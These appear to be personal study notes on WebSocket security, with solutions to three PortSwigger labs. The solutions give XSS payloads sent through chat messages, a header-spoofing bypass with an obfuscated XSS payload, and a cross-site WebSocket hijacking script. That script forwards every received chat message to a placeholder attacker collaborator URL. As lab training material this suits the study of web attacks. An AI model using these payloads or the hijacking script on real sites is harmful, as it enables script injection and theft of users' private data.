# WebSockets
- WebSockets are a bi-directional, full-duplex communication protocol that starts over HTTP. They are often used in modern web applications for streaming data and handling other asynchronous traffic.  
- WebSockets are initiated over HTTP and establish long-lived connections that support asynchronous communication in both directions.  
# WebSockets security vulnerabilities
Most input-based vulnerabilities in WebSockets can be identified and exploited by manipulating the contents of WebSocket messages.
- SQLi or XML external entity injection
- OAST
- XSS 
### Labs Portswigger
1. **Manipulating WebSocket messages to exploit vulnerabilities**
> Write something in Live Chat. Go to WebSocket History tab in Burp, catch you request and send it to Repeater. Change your message to `<img src=123 onerror=alert()>`
2. **Manipulating the WebSocket handshake to exploit vulnerabilities**
```
X-Forwarded-For: 1.1.1.1
<img src=1 oNeRrOr=alert`1`>
```
3. **Cross-site WebSocket hijacking**  
https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
```
<script>
    var ws = new WebSocket('wss://your-websocket-url/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
